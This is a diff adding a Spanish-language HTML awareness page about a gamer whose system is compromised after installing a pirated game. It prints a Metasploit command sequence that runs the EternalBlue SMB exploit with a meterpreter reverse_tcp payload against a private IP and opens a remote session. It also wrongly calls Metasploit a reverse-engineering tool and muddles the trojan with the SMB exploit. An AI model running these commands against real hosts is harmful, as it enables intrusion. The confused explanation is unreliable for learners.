@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Escenario: Ataque a través de un Juego Pirata</title>
+    <style>
+        h1 {
+            color: #007BFF;
+        }
+
+        h2 {
+            color: #333;
+        }
+
+        pre {
+            background-color: #000;
+            color: #00FF00;
+            padding: 10px;
+            white-space: pre-wrap;
+            border-radius: 10px;
+        }
+    </style>
+</head>
+
+<body>
+    <h1>Escenario: Ingeniería Inversa en Acción</h1>
+<br>
+<img src="../images/wallpaper/juan.jpeg" style="float: left; margin: 10px 20px 10px 0; max-width: 150px;">
+
+    <h2>El Inicio del Incidente</h2>
+    <p>Conozcamos a Juan, un apasionado jugador de videojuegos que decidió descargar un juego pirata desde un sitio web
+        no confiable. Lo que Juan no sabía es que ese juego contenía un troyano malicioso.</p>
+    <p>El troyano se ejecuta en el sistema de Juan, creando una puerta trasera y proporcionando acceso al atacante. El
+        atacante utiliza Metasploit, una herramienta de ingeniería inversa, para aprovechar esta puerta trasera y tomar
+        el control del sistema de Juan.</p>
+<br>
+    <h2>La Serie de Comandos del Atacante</h2>
+    <p>A continuación, se muestran los comandos que el atacante podría utilizar para explotar el sistema de Juan:</p>
+     <br>
+    <pre>
+        <code>
+        
+        # Inicia Metasploit
+        msfconsole 
+        <br>
+        # Selecciona el exploit EternalBlue
+        use exploit/windows/smb/ms17_010_eternalblue    
+        <br>
+        # Establece la IP de Juan
+        set RHOSTS 192.168.1.100 
+        <br> 
+        # Configura la carga útil
+        set payload windows/meterpreter/reverse_tcp
+        <br>  
+        # Ejecuta el exploit  
+        exploit 
+        <br>     
+        # Abre la sesión interactiva                 
+        sessions -i 1                  
+        </code>
+        </pre>
+
+<br>
+    <p>Una vez que el atacante tiene acceso al sistema de Juan, puede realizar acciones maliciosas, como exfiltrar
+        datos, instalar malware adicional o controlar el sistema de forma remota. El sistema de Juan ha sido
+        comprometido debido a la descarga de software pirata no confiable.</p>
+
+        <br>
+    <h2 class="leter"> Lección Aprendida</h2>
+    <p>Si hay algo que podemos aprender hoy en dia de internet 
+        es que hay pocas cosas que son gratis , no olvidemos que despues de todo , nosotros somos el producto
+        de alguien  y aunque no se le quiera quitar merito y verdad a las comunidades con buenas intenciones  
+        en la interaccion y transferencia de software no licenciado no siempre es correcto incurrir en estas practicas.
+    </p>
+</body>
+
+</html>
